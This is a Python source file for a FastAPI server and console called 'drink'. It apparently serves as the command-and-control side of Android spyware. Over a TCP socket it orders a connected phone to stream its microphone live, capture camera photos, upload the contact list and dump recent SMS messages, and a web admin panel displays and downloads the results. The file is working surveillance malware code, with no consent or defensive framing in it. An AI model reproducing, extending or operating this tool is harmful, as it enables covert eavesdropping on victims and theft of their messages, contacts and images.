import asyncio
import json
import os
import struct
import sys
import threading
import time
from collections import deque
from pathlib import Path
from typing import Optional, Set

import uvicorn
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, JSONResponse, Response

TCP_HOST = "192.168.1.149"
TCP_PORT = 33110
WEB_PORT = 3000

app = FastAPI()

state = {
    "tcp_server": None,
    "client_reader": None,
    "client_writer": None,
    "client_addr": None,
    "listening": False,
    "mic_active": False,
    "cameras": [],
    "latest_photo": None,
    "latest_photo_bytes": None,
    "latest_contacts": None,
    "latest_contacts_bytes": None,
    "latest_sms": [],
}

logs = deque(maxlen=100)
audio_clients: Set[WebSocket] = set()
loop: asyncio.AbstractEventLoop = None


def log_event(msg: str):
    ts = time.strftime("%H:%M:%S")
    formatted = f"[{ts}] {msg}"
    logs.append(formatted)


HTML_MIC_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>drink — Mic Stream</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: #fbfbfd;
    color: #1d1d1f;
    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", Helvetica, Arial, sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    padding: 20px;
  }
  .card {
    background: #ffffff;
    border: 1px solid #e5e5ea;
    border-radius: 18px;
    box-shadow: 0 4px 24px rgba(0, 0, 0, 0.04);
    padding: 36px 40px;
    max-width: 440px;
    width: 100%;
    text-align: center;
  }
  h1 {
    font-size: 1.5rem;
    font-weight: 600;
    letter-spacing: -0.02em;
    margin-bottom: 8px;
  }
  p.subtitle {
    color: #86868b;
    font-size: 0.9rem;
    margin-bottom: 24px;
  }
  .indicator-box {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    margin-bottom: 28px;
  }
  .pulse-dot {
    width: 10px;
    height: 10px;
    border-radius: 50%;
    background: #86868b;
    transition: all 0.3s;
  }
  .pulse-dot.active {
    background: #34c759;
    box-shadow: 0 0 10px rgba(52, 199, 89, 0.6);
  }
  #status {
    font-size: 0.95rem;
    font-weight: 500;
  }
  .nav-btn {
    display: inline-block;
    padding: 10px 20px;
    background: #f5f5f7;
    color: #1d1d1f;
    border-radius: 980px;
    text-decoration: none;
    font-size: 0.85rem;
    font-weight: 500;
    transition: background 0.15s;
  }
  .nav-btn:hover {
    background: #e8e8ed;
  }
</style>
</head>
<body>
<div class="card">
  <h1>Microphone Stream</h1>
  <p class="subtitle">Live audio stream from connected device</p>
  <div class="indicator-box">
    <div class="pulse-dot" id="dot"></div>
    <span id="status">Connecting…</span>
  </div>
  <a href="/" class="nav-btn">← Admin Panel</a>
</div>
<script>
(function () {
  const status = document.getElementById('status');
  const dot = document.getElementById('dot');
  const ctx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
  const ws = new WebSocket('ws://' + location.hostname + ':' + location.port + '/ws/audio');
  ws.binaryType = 'arraybuffer';

  ws.onopen = () => {
    status.textContent = 'Connected — waiting for audio';
    dot.className = 'pulse-dot active';
  };
  ws.onclose = () => {
    status.textContent = 'Disconnected';
    dot.className = 'pulse-dot';
  };
  ws.onerror = () => {
    status.textContent = 'Error';
    dot.className = 'pulse-dot';
  };

  let nextTime = 0;

  ws.onmessage = (event) => {
    const pcm = new Int16Array(event.data);
    const float32 = new Float32Array(pcm.length);
    for (let i = 0; i < pcm.length; i++) {
      float32[i] = pcm[i] / 32768.0;
    }
    const buffer = ctx.createBuffer(1, float32.length, 16000);
    buffer.copyToChannel(float32, 0);
    const source = ctx.createBufferSource();
    source.buffer = buffer;
    source.connect(ctx.destination);
    const now = ctx.currentTime;
    const startAt = Math.max(now, nextTime);
    source.start(startAt);
    nextTime = startAt + buffer.duration;
    status.textContent = 'Streaming live';
  };
})();
</script>
</body>
</html>"""

HTML_ADMIN_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>drink — Admin Panel</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: #fbfbfd;
    color: #1d1d1f;
    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Helvetica Neue", Helvetica, Arial, sans-serif;
    padding: 0 0 60px 0;
    -webkit-font-smoothing: antialiased;
  }
  header {
    background: rgba(255, 255, 255, 0.85);
    backdrop-filter: blur(20px);
    -webkit-backdrop-filter: blur(20px);
    border-bottom: 1px solid #e5e5ea;
    position: sticky;
    top: 0;
    z-index: 100;
    padding: 16px 28px;
    display: flex;
    justify-content: space-between;
    align-items: center;
  }
  .brand {
    font-size: 1.25rem;
    font-weight: 700;
    letter-spacing: -0.03em;
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .badge {
    font-size: 0.72rem;
    padding: 3px 9px;
    border-radius: 980px;
    font-weight: 600;
    letter-spacing: 0.02em;
    text-transform: uppercase;
  }
  .badge-off { background: #f2f2f7; color: #8e8e93; }
  .badge-on { background: #e4f7e8; color: #34c759; }
  .badge-warn { background: #fff3db; color: #ff9500; }
  .badges-group {
    display: flex;
    gap: 8px;
  }
  .container {
    max-width: 1080px;
    margin: 32px auto 0 auto;
    padding: 0 24px;
  }
  .grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
    gap: 20px;
    margin-bottom: 24px;
  }
  .card {
    background: #ffffff;
    border: 1px solid #e5e5ea;
    border-radius: 16px;
    padding: 24px;
    box-shadow: 0 2px 8px rgba(0,0,0,0.02);
    display: flex;
    flex-direction: column;
  }
  .card-title {
    font-size: 1.05rem;
    font-weight: 600;
    margin-bottom: 6px;
    letter-spacing: -0.01em;
  }
  .card-desc {
    color: #86868b;
    font-size: 0.82rem;
    margin-bottom: 18px;
  }
  .card-actions {
    margin-top: auto;
    display: flex;
    flex-wrap: wrap;
    gap: 8px;
  }
  button, .btn-link {
    cursor: pointer;
    border: none;
    border-radius: 8px;
    padding: 8px 14px;
    font-size: 0.85rem;
    font-weight: 500;
    transition: all 0.15s ease-in-out;
    text-decoration: none;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
  }
  .btn-primary { background: #0071e3; color: #fff; }
  .btn-primary:hover { background: #0077ed; }
  .btn-secondary { background: #f5f5f7; color: #1d1d1f; }
  .btn-secondary:hover { background: #e8e8ed; }
  .btn-danger { background: #fff; color: #ff3b30; border: 1px solid #ffd1d0; }
  .btn-danger:hover { background: #ffebeb; }
  .btn-green { background: #34c759; color: #fff; }
  .btn-green:hover { background: #2ebd52; }
  input[type="number"], input[type="text"] {
    border: 1px solid #d2d2d7;
    border-radius: 8px;
    padding: 8px 12px;
    font-size: 0.85rem;
    outline: none;
    transition: border-color 0.15s;
  }
  input[type="number"]:focus, input[type="text"]:focus {
    border-color: #0071e3;
  }
  .field-row {
    display: flex;
    align-items: center;
    gap: 8px;
    margin-bottom: 12px;
  }
  .stat-row {
    display: flex;
    justify-content: space-between;
    font-size: 0.82rem;
    padding: 6px 0;
    border-bottom: 1px solid #f2f2f7;
  }
  .stat-label { color: #86868b; }
  .stat-val { font-weight: 500; }
  .log-console {
    background: #1c1c1e;
    color: #30d158;
    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
    font-size: 0.78rem;
    padding: 16px;
    border-radius: 12px;
    height: 180px;
    overflow-y: auto;
    white-space: pre-wrap;
    line-height: 1.45;
  }
  .preview-box {
    margin-top: 14px;
    border-radius: 10px;
    overflow: hidden;
    background: #f5f5f7;
    border: 1px solid #e5e5ea;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 140px;
  }
  .preview-img {
    max-width: 100%;
    height: auto;
    display: block;
  }
  .sms-list {
    max-height: 220px;
    overflow-y: auto;
    border: 1px solid #e5e5ea;
    border-radius: 8px;
    margin-top: 12px;
    padding: 8px;
    background: #fafafa;
    display: flex;
    flex-direction: column;
    gap: 6px;
  }
  .sms-item {
    background: #fff;
    border: 1px solid #ededed;
    border-radius: 6px;
    padding: 8px 10px;
    font-size: 0.8rem;
  }
  .sms-meta {
    display: flex;
    justify-content: space-between;
    color: #86868b;
    font-size: 0.72rem;
    margin-bottom: 4px;
  }
  .sms-body {
    color: #1d1d1f;
    word-break: break-word;
  }
</style>
</head>
<body>
<header>
  <div class="brand">
    drink
  </div>
  <div class="badges-group">
    <span class="badge badge-off" id="tcpBadge">TCP: Stopped</span>
    <span class="badge badge-off" id="clientBadge">Client: Disconnected</span>
    <span class="badge badge-off" id="micBadge">Mic: Off</span>
  </div>
</header>

<div class="container">
  <div class="grid">

    <div class="card">
      <div class="card-title">Server Controls</div>
      <div class="card-desc">TCP listener and process management</div>
      <div class="stat-row">
        <span class="stat-label">TCP Target</span>
        <span class="stat-val" id="tcpAddr">192.168.1.149:33110</span>
      </div>
      <div class="stat-row">
        <span class="stat-label">Web Console</span>
        <span class="stat-val">Port 3000</span>
      </div>
      <div class="card-actions" style="margin-top: 16px;">
        <button class="btn-primary" id="btnStartServer" onclick="startServer()">Start Listen</button>
        <button class="btn-secondary" id="btnStopServer" onclick="stopServer()">Stop Listen</button>
        <button class="btn-danger" onclick="killServer()">Kill Server</button>
      </div>
    </div>

    <div class="card">
      <div class="card-title">Android Client</div>
      <div class="card-desc">Active socket session status</div>
      <div class="stat-row">
        <span class="stat-label">Remote Address</span>
        <span class="stat-val" id="clientAddr">None</span>
      </div>
      <div class="stat-row">
        <span class="stat-label">Connection Status</span>
        <span class="stat-val" id="clientStatusText">Waiting for client…</span>
      </div>
      <div class="card-actions" style="margin-top: 16px;">
        <button class="btn-danger" onclick="disconnectClient()">Disconnect Client</button>
      </div>
    </div>

    <div class="card">
      <div class="card-title">Microphone Stream</div>
      <div class="card-desc">Live 16kHz PCM audio streaming</div>
      <div class="stat-row">
        <span class="stat-label">Stream Status</span>
        <span class="stat-val" id="micStatusText">Inactive</span>
      </div>
      <div class="card-actions" style="margin-top: 16px;">
        <button class="btn-green" onclick="startMic()">Start Mic</button>
        <button class="btn-secondary" onclick="stopMic()">Stop Mic</button>
        <a href="/mic" target="_blank" class="btn-link btn-secondary">Open Mic Page ↗</a>
      </div>
    </div>

    <div class="card">
      <div class="card-title">Camera Management</div>
      <div class="card-desc">Camera detection and still image capture</div>
      <div class="field-row">
        <button class="btn-secondary" onclick="listCameras()">List Cameras</button>
        <div id="cameraButtons" style="display: flex; gap: 6px; flex-wrap: wrap;"></div>
      </div>
      <div class="field-row">
        <input type="number" id="camIdInput" placeholder="Camera ID" value="0" style="width: 100px;">
        <button class="btn-primary" onclick="captureCamera()">Use Cam</button>
      </div>
      <div class="preview-box" id="cameraPreview">
        <span style="font-size: 0.8rem; color: #86868b;">No photo captured</span>
      </div>
    </div>

    <div class="card">
      <div class="card-title">Contacts</div>
      <div class="card-desc">Download address book as zip archive</div>
      <div class="card-actions">
        <button class="btn-primary" onclick="getContacts()">Pull Contacts</button>
        <a href="/api/contacts/download" id="btnDownloadContacts" class="btn-link btn-secondary" style="display: none;">Download contacts.zip</a>
      </div>
    </div>

    <div class="card">
      <div class="card-title">SMS Messages</div>
      <div class="card-desc">Query device SMS database</div>
      <div class="field-row">
        <input type="number" id="smsHoursInput" value="24" style="width: 100px;" placeholder="Hours">
        <button class="btn-primary" onclick="getSms()">Get SMS</button>
      </div>
      <div class="sms-list" id="smsContainer">
        <span style="font-size: 0.8rem; color: #86868b; padding: 4px;">No messages loaded</span>
      </div>
    </div>

  </div>

  <div class="card" style="margin-top: 8px;">
    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
      <div class="card-title" style="margin: 0;">Live Activity Console</div>
      <button class="btn-secondary" style="padding: 4px 10px; font-size: 0.75rem;" onclick="clearLogs()">Clear</button>
    </div>
    <div class="log-console" id="logConsole"></div>
  </div>
</div>

<script>
let lastStatus = {};

async function api(path, options = {}) {
  try {
    const res = await fetch(path, options);
    return await res.json();
  } catch (e) {
    return null;
  }
}

async function startServer() {
  await api('/api/server/start', { method: 'POST' });
  refreshStatus();
}

async function stopServer() {
  await api('/api/server/stop', { method: 'POST' });
  refreshStatus();
}

async function killServer() {
  if (confirm('Kill server process?')) {
    await api('/api/server/kill', { method: 'POST' });
    document.body.innerHTML = '<div style="padding: 40px; text-align: center; font-family: sans-serif;">Server terminated.</div>';
  }
}

async function disconnectClient() {
  await api('/api/client/disconnect', { method: 'POST' });
  refreshStatus();
}

async function startMic() {
  await api('/api/client/mic/start', { method: 'POST' });
  refreshStatus();
}

async function stopMic() {
  await api('/api/client/mic/stop', { method: 'POST' });
  refreshStatus();
}

async function listCameras() {
  const res = await api('/api/client/cameras', { method: 'POST' });
  if (res && res.data) {
    renderCamButtons(res.data);
  }
}

function renderCamButtons(cams) {
  const box = document.getElementById('cameraButtons');
  box.innerHTML = '';
  cams.forEach(cam => {
    const btn = document.createElement('button');
    btn.className = 'btn-secondary';
    btn.textContent = 'Cam ' + cam;
    btn.onclick = () => {
      document.getElementById('camIdInput').value = cam;
      captureCamera();
    };
    box.appendChild(btn);
  });
}

async function captureCamera() {
  const camId = document.getElementById('camIdInput').value || '0';
  const res = await api('/api/client/camera/capture', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ cam_id: camId })
  });
  if (res && res.status === 'ok') {
    const preview = document.getElementById('cameraPreview');
    preview.innerHTML = '<img class="preview-img" src="/api/photo/latest?t=' + Date.now() + '">';
  }
}

async function getContacts() {
  const res = await api('/api/client/contacts', { method: 'POST' });
  if (res && res.status === 'ok') {
    document.getElementById('btnDownloadContacts').style.display = 'inline-flex';
  }
}

async function getSms() {
  const hours = parseInt(document.getElementById('smsHoursInput').value) || 24;
  const res = await api('/api/client/sms', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ hours })
  });
  if (res && res.data) {
    renderSms(res.data);
  }
}

function renderSms(messages) {
  const container = document.getElementById('smsContainer');
  if (!messages || messages.length === 0) {
    container.innerHTML = '<span style="font-size: 0.8rem; color: #86868b; padding: 4px;">No messages found in time range</span>';
    return;
  }
  container.innerHTML = '';
  messages.forEach(msg => {
    const item = document.createElement('div');
    item.className = 'sms-item';
    const direction = msg.type === 1 ? '▼ Received' : '▲ Sent';
    const dateStr = msg.date ? new Date(msg.date).toLocaleString() : '';
    item.innerHTML = `
      <div class="sms-meta">
        <span><strong>${direction}</strong> ${msg.address || '?'}</span>
        <span>${dateStr}</span>
      </div>
      <div class="sms-body">${msg.body || ''}</div>
    `;
    container.appendChild(item);
  });
}

async function refreshStatus() {
  const s = await api('/api/status');
  if (!s) return;
  lastStatus = s;

  const tcpBadge = document.getElementById('tcpBadge');
  if (s.listening) {
    tcpBadge.textContent = 'TCP: Listening';
    tcpBadge.className = 'badge badge-on';
  } else {
    tcpBadge.textContent = 'TCP: Stopped';
    tcpBadge.className = 'badge badge-off';
  }

  const clientBadge = document.getElementById('clientBadge');
  const clientAddr = document.getElementById('clientAddr');
  const clientStatusText = document.getElementById('clientStatusText');
  if (s.client_connected) {
    clientBadge.textContent = 'Client: Connected';
    clientBadge.className = 'badge badge-on';
    clientAddr.textContent = s.client_addr || 'Connected';
    clientStatusText.textContent = 'Connected';
  } else {
    clientBadge.textContent = 'Client: Disconnected';
    clientBadge.className = 'badge badge-off';
    clientAddr.textContent = 'None';
    clientStatusText.textContent = s.listening ? 'Waiting for connection…' : 'Server stopped';
  }

  const micBadge = document.getElementById('micBadge');
  const micStatusText = document.getElementById('micStatusText');
  if (s.mic_active) {
    micBadge.textContent = 'Mic: Streaming';
    micBadge.className = 'badge badge-on';
    micStatusText.textContent = 'Streaming live';
  } else {
    micBadge.textContent = 'Mic: Off';
    micBadge.className = 'badge badge-off';
    micStatusText.textContent = 'Inactive';
  }

  if (s.has_contacts) {
    document.getElementById('btnDownloadContacts').style.display = 'inline-flex';
  }

  if (s.cameras && s.cameras.length > 0) {
    renderCamButtons(s.cameras);
  }
}

async function refreshLogs() {
  const lines = await api('/api/logs');
  if (lines) {
    const consoleBox = document.getElementById('logConsole');
    consoleBox.textContent = lines.join('\\n');
    consoleBox.scrollTop = consoleBox.scrollHeight;
  }
}

function clearLogs() {
  document.getElementById('logConsole').textContent = '';
}

setInterval(refreshStatus, 1500);
setInterval(refreshLogs, 2000);
refreshStatus();
refreshLogs();
</script>
</body>
</html>"""


@app.get("/", response_class=HTMLResponse)
async def index():
    return HTML_ADMIN_PAGE


@app.get("/mic", response_class=HTMLResponse)
async def mic_page():
    return HTML_MIC_PAGE


@app.websocket("/ws/audio")
async def ws_audio(websocket: WebSocket):
    await websocket.accept()
    audio_clients.add(websocket)
    try:
        while True:
            await websocket.receive_bytes()
    except WebSocketDisconnect:
        pass
    finally:
        audio_clients.discard(websocket)


async def broadcast_audio(chunk: bytes):
    dead = set()
    for ws in audio_clients:
        try:
            await ws.send_bytes(chunk)
        except Exception:
            dead.add(ws)
    audio_clients.difference_update(dead)


async def send_frame(writer: asyncio.StreamWriter, payload: bytes):
    header = struct.pack(">I", len(payload))
    writer.write(header + payload)
    await writer.drain()


async def recv_frame(reader: asyncio.StreamReader) -> bytes:
    raw_len = await reader.readexactly(4)
    length = struct.unpack(">I", raw_len)[0]
    return await reader.readexactly(length)


async def send_command(cmd: dict):
    writer = state["client_writer"]
    if writer is None:
        print("no client connected")
        return
    await send_frame(writer, json.dumps(cmd).encode())


def client_connected() -> bool:
    return state["client_writer"] is not None


def clear_client():
    state["client_reader"] = None
    state["client_writer"] = None
    state["client_addr"] = None
    state["mic_active"] = False


async def handle_mic_stream(reader: asyncio.StreamReader):
    state["mic_active"] = True
    log_event("mic stream started — open http://localhost:3000/mic to listen")
    print("\n[mic] streaming started — open http://localhost:3000/mic to listen")
    print("drink> ", end="", flush=True)
    try:
        while state["mic_active"] and state["client_writer"] is not None:
            try:
                header_bytes = await asyncio.wait_for(recv_frame(reader), timeout=5.0)
            except asyncio.TimeoutError:
                continue
            header = json.loads(header_bytes.decode())
            if header.get("type") != "mic_chunk":
                break
            audio_data = await recv_frame(reader)
            await broadcast_audio(audio_data)
    except (asyncio.IncompleteReadError, ConnectionResetError):
        pass
    except Exception as e:
        log_event(f"mic stream error: {e}")
    finally:
        state["mic_active"] = False
        log_event("mic stream ended")
        print("\n[mic] stream ended")
        print("drink> ", end="", flush=True)


async def handle_contacts(reader: asyncio.StreamReader) -> Optional[str]:
    try:
        header_bytes = await asyncio.wait_for(recv_frame(reader), timeout=15.0)
        header = json.loads(header_bytes.decode())
        if header.get("type") == "error":
            msg = header.get("message", "unknown error")
            log_event(f"contacts error from client: {msg}")
            print(f"[contacts] error from client: {msg}")
            return None
        if header.get("type") != "contacts":
            log_event(f"contacts unexpected response: {header.get('type')}")
            print(f"[contacts] unexpected response type: {header.get('type')}")
            return None
        data = await recv_frame(reader)
        dest = Path.home() / "Desktop" / "contacts.zip"
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_bytes(data)
        state["latest_contacts"] = dest
        state["latest_contacts_bytes"] = data
        log_event(f"contacts saved {len(data)} bytes to {dest}")
        print(f"[contacts] saved {len(data)} bytes → {dest}")
        return str(dest)
    except Exception as e:
        log_event(f"contacts error: {e}")
        print(f"[contacts] error: {e}")
        return None


async def handle_sms(reader: asyncio.StreamReader, requested_hours: int):
    try:
        header_bytes = await asyncio.wait_for(recv_frame(reader), timeout=15.0)
        header = json.loads(header_bytes.decode())
        if header.get("type") == "error":
            msg = header.get("message", "unknown error")
            log_event(f"sms error from client: {msg}")
            print(f"[sms] error from client: {msg}")
            return []
        if header.get("type") != "sms":
            log_event(f"sms unexpected response: {header.get('type')}")
            print(f"[sms] unexpected response type: {header.get('type')}")
            return []
        messages = header.get("data", [])
        actual_hours = header.get("hours", requested_hours)
        state["latest_sms"] = messages
        log_event(f"sms received {len(messages)} messages (last {actual_hours}h)")
        print(f"\n[sms] {len(messages)} messages (last {actual_hours}h):")
        for msg in messages:
            addr = msg.get("address", "?")
            body = msg.get("body", "")
            ts = msg.get("date", "")
            direction = "▼" if msg.get("type") == 1 else "▲"
            print(f"  {direction} [{ts}] {addr}: {body}")
        if not messages:
            print("  (none)")
        return messages
    except Exception as e:
        log_event(f"sms error: {e}")
        print(f"[sms] error: {e}")
        return []


async def handle_list_cams(reader: asyncio.StreamReader):
    try:
        header_bytes = await asyncio.wait_for(recv_frame(reader), timeout=10.0)
        header = json.loads(header_bytes.decode())
        if header.get("type") == "error":
            msg = header.get("message", "unknown error")
            log_event(f"camera list error: {msg}")
            print(f"[cameras] error from client: {msg}")
            return []
        if header.get("type") != "cams":
            log_event(f"cameras unexpected response: {header.get('type')}")
            print(f"[cameras] unexpected response: {header.get('type')}")
            return []
        cams = header.get("data", [])
        state["cameras"] = cams
        log_event(f"detected cameras: {cams}")
        for cam in cams:
            print(cam)
        return cams
    except Exception as e:
        log_event(f"camera list error: {e}")
        print(f"[cameras] error: {e}")
        return []


async def handle_camera_capture(reader: asyncio.StreamReader, cam_id: str):
    try:
        header_bytes = await asyncio.wait_for(recv_frame(reader), timeout=15.0)
        header = json.loads(header_bytes.decode())
        if header.get("type") == "error":
            msg = header.get("message", "unknown error")
            log_event(f"camera {cam_id} error: {msg}")
            print(f"[cam {cam_id}] error from client: {msg}")
            return None
        if header.get("type") != "camera_capture":
            log_event(f"camera unexpected response: {header.get('type')}")
            print(f"[cam {cam_id}] unexpected response: {header.get('type')}")
            return None
        data = await recv_frame(reader)
        ts = int(time.time())
        dest = Path.home() / "Desktop" / f"cam_{cam_id}_{ts}.jpg"
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_bytes(data)
        state["latest_photo"] = dest
        state["latest_photo_bytes"] = data
        log_event(f"camera {cam_id} captured {len(data)} bytes saved to {dest}")
        print(f"[cam {cam_id}] saved {len(data)} bytes → {dest}")
        return str(dest)
    except Exception as e:
        log_event(f"camera capture error: {e}")
        print(f"[cam {cam_id}] error: {e}")
        return None


async def client_session(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    addr = writer.get_extra_info("peername")
    state["client_reader"] = reader
    state["client_writer"] = writer
    state["client_addr"] = addr
    log_event(f"client connected from {addr}")
    print(f"\n[+] client connected from {addr}")
    print("drink> ", end="", flush=True)
    try:
        await asyncio.Event().wait()
    except Exception:
        pass


async def tcp_client_handler(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    if client_connected():
        writer.close()
        await writer.wait_closed()
        return
    await client_session(reader, writer)


async def start_tcp_server_action():
    if state["listening"]:
        print("already listening")
        return {"status": "already_listening"}
    server = await asyncio.start_server(tcp_client_handler, TCP_HOST, TCP_PORT)
    state["tcp_server"] = server
    state["listening"] = True
    log_event(f"TCP server listening on {TCP_HOST}:{TCP_PORT}")
    print(f"[*] listening on {TCP_HOST}:{TCP_PORT}")
    return {"status": "started", "host": TCP_HOST, "port": TCP_PORT}


async def stop_tcp_server_action():
    if not state["listening"]:
        print("not listening")
        return {"status": "not_listening"}
    server = state["tcp_server"]
    if server:
        server.close()
        await server.wait_closed()
        state["tcp_server"] = None
        state["listening"] = False
    if state["client_writer"]:
        try:
            state["client_writer"].close()
            await state["client_writer"].wait_closed()
        except Exception:
            pass
        clear_client()
    log_event("TCP server stopped")
    print("[*] TCP server stopped")
    return {"status": "stopped"}


async def cmd_disconnect():
    if not client_connected():
        print("no client connected")
        return {"status": "no_client"}
    await send_command({"cmd": "disconnect"})
    if state["client_writer"]:
        try:
            state["client_writer"].close()
            await state["client_writer"].wait_closed()
        except Exception:
            pass
    clear_client()
    log_event("client disconnected")
    print("[*] client disconnected")
    return {"status": "disconnected"}


async def cmd_use_mic():
    if not client_connected():
        print("no client connected")
        return {"status": "no_client"}
    if state["mic_active"]:
        print("mic already active")
        return {"status": "already_active"}
    await send_command({"cmd": "use_mic"})
    reader = state["client_reader"]
    loop.create_task(handle_mic_stream(reader))
    return {"status": "started"}


async def cmd_get_contacts():
    if not client_connected():
        print("no client connected")
        return {"status": "no_client"}
    await send_command({"cmd": "get_contacts"})
    reader = state["client_reader"]
    dest = await handle_contacts(reader)
    return {"status": "ok" if dest else "failed", "path": dest}


async def cmd_get_sms(hours: int = 24):
    if not client_connected():
        print("no client connected")
        return {"status": "no_client", "data": []}
    await send_command({"cmd": "get_sms", "hours": hours})
    reader = state["client_reader"]
    messages = await handle_sms(reader, hours)
    return {"status": "ok", "data": messages}


async def cmd_list_cams():
    if not client_connected():
        print("no client connected")
        return {"status": "no_client", "data": []}
    await send_command({"cmd": "list_cams"})
    reader = state["client_reader"]
    cams = await handle_list_cams(reader)
    return {"status": "ok", "data": cams}


async def cmd_use_cam(cam_id: str):
    if not client_connected():
        print("no client connected")
        return {"status": "no_client", "path": None}
    await send_command({"cmd": "use_cam", "cam_id": str(cam_id)})
    reader = state["client_reader"]
    dest = await handle_camera_capture(reader, str(cam_id))
    return {"status": "ok" if dest else "failed", "path": dest}


@app.get("/api/status")
async def api_status():
    return {
        "listening": state["listening"],
        "client_connected": client_connected(),
        "client_addr": f"{state['client_addr'][0]}:{state['client_addr'][1]}" if state["client_addr"] else None,
        "mic_active": state["mic_active"],
        "tcp_host": TCP_HOST,
        "tcp_port": TCP_PORT,
        "cameras": state["cameras"],
        "has_photo": state["latest_photo_bytes"] is not None,
        "has_contacts": state["latest_contacts_bytes"] is not None,
        "sms_count": len(state["latest_sms"]),
    }


@app.get("/api/logs")
async def api_logs():
    return list(logs)


@app.post("/api/server/start")
async def api_server_start():
    fut = asyncio.run_coroutine_threadsafe(start_tcp_server_action(), loop)
    res = await asyncio.wrap_future(fut)
    return res


@app.post("/api/server/stop")
async def api_server_stop():
    fut = asyncio.run_coroutine_threadsafe(stop_tcp_server_action(), loop)
    res = await asyncio.wrap_future(fut)
    return res


@app.post("/api/server/kill")
async def api_server_kill():
    def kill_soon():
        time.sleep(0.5)
        os._exit(0)
    threading.Thread(target=kill_soon, daemon=True).start()
    return {"status": "killing"}


@app.post("/api/client/disconnect")
async def api_client_disconnect():
    fut = asyncio.run_coroutine_threadsafe(cmd_disconnect(), loop)
    res = await asyncio.wrap_future(fut)
    return res


@app.post("/api/client/mic/start")
async def api_mic_start():
    fut = asyncio.run_coroutine_threadsafe(cmd_use_mic(), loop)
    res = await asyncio.wrap_future(fut)
    return res


@app.post("/api/client/mic/stop")
async def api_mic_stop():
    state["mic_active"] = False
    return {"status": "stopped"}


@app.post("/api/client/contacts")
async def api_client_contacts():
    fut = asyncio.run_coroutine_threadsafe(cmd_get_contacts(), loop)
    res = await asyncio.wrap_future(fut)
    return res


@app.post("/api/client/sms")
async def api_client_sms(payload: dict = None):
    hours = 24
    if payload and "hours" in payload:
        try:
            hours = int(payload["hours"])
        except Exception:
            hours = 24
    fut = asyncio.run_coroutine_threadsafe(cmd_get_sms(hours), loop)
    res = await asyncio.wrap_future(fut)
    return res


@app.get("/api/sms/latest")
async def api_sms_latest():
    return state["latest_sms"]


@app.post("/api/client/cameras")
async def api_client_cameras():
    fut = asyncio.run_coroutine_threadsafe(cmd_list_cams(), loop)
    res = await asyncio.wrap_future(fut)
    return res


@app.post("/api/client/camera/capture")
async def api_client_camera_capture(payload: dict = None):
    cam_id = "0"
    if payload and "cam_id" in payload:
        cam_id = str(payload["cam_id"])
    fut = asyncio.run_coroutine_threadsafe(cmd_use_cam(cam_id), loop)
    res = await asyncio.wrap_future(fut)
    return res


@app.get("/api/photo/latest")
async def api_photo_latest():
    if state["latest_photo_bytes"]:
        return Response(content=state["latest_photo_bytes"], media_type="image/jpeg")
    return Response(content=b"", status_code=404)


@app.get("/api/contacts/download")
async def api_contacts_download():
    if state["latest_contacts_bytes"]:
        return Response(
            content=state["latest_contacts_bytes"],
            media_type="application/zip",
            headers={"Content-Disposition": "attachment; filename=contacts.zip"},
        )
    return Response(content=b"", status_code=404)


def print_help(post_start: bool = False, post_connect: bool = False):
    if not post_start:
        print("  start            start listening for TCP connections")
        print("  quit             exit")
        return
    if not post_connect:
        print("  stop             stop listening")
        print("  quit             exit")
        print("  (waiting for client…)")
        return
    print("  disconnect       disconnect the Android client")
    print("  use mic          start mic audio stream")
    print("  get contacts     download contacts.zip to Desktop")
    print("  get sms [hours]  fetch SMS messages (default 24h)")
    print("  list             list available cameras")
    print("  use cam <id>     capture photo from camera (e.g. use cam 0)")
    print("  stop             stop server and disconnect client")
    print("  quit             exit")
    print("  help             show this help")


async def shell_loop():
    executor_loop = asyncio.get_event_loop()

    def read_line():
        sys.stdout.write("drink> ")
        sys.stdout.flush()
        return sys.stdin.readline()

    while True:
        line = await executor_loop.run_in_executor(None, read_line)
        line = line.strip()
        if not line:
            continue

        cmd = line.lstrip("/").strip()

        if cmd in ("quit", "exit"):
            print("bye.")
            os._exit(0)

        if cmd == "start":
            if state["listening"]:
                print("already listening")
            else:
                executor_loop.create_task(start_tcp_server_action())
            continue

        if cmd == "stop":
            if not state["listening"]:
                print("not listening")
            else:
                await stop_tcp_server_action()
            continue

        if cmd == "disconnect":
            await cmd_disconnect()
            continue

        if cmd == "use mic":
            await cmd_use_mic()
            continue

        if cmd == "get contacts":
            await cmd_get_contacts()
            continue

        if cmd == "get sms" or cmd.startswith("get sms "):
            parts = cmd.split()
            hours = 24
            if len(parts) >= 3 and parts[2].isdigit():
                hours = int(parts[2])
            await cmd_get_sms(hours)
            continue

        if cmd == "list" or cmd == "list cams" or cmd == "list cameras":
            await cmd_list_cams()
            continue

        if cmd.startswith("use cam"):
            parts = cmd.split()
            cam_id = parts[2] if len(parts) >= 3 else "0"
            await cmd_use_cam(cam_id)
            continue

        if cmd == "help":
            print_help(state["listening"], client_connected())
            continue

